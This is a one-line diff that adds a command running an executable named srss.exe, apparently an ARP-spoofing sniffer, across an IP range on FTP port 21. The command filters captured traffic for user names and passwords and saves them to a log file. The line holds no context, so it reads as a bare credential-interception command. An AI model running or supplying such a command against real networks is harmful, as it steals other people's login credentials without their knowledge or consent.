@@ -1,0 +1,1 @@
+srss.exe -idx 0 -ip 121.10.133.12-121.10.133.102 -port 21 -logfilter "_USER ,_PASS" -save_a sniff.log -spoofmode 1 -Interval 1
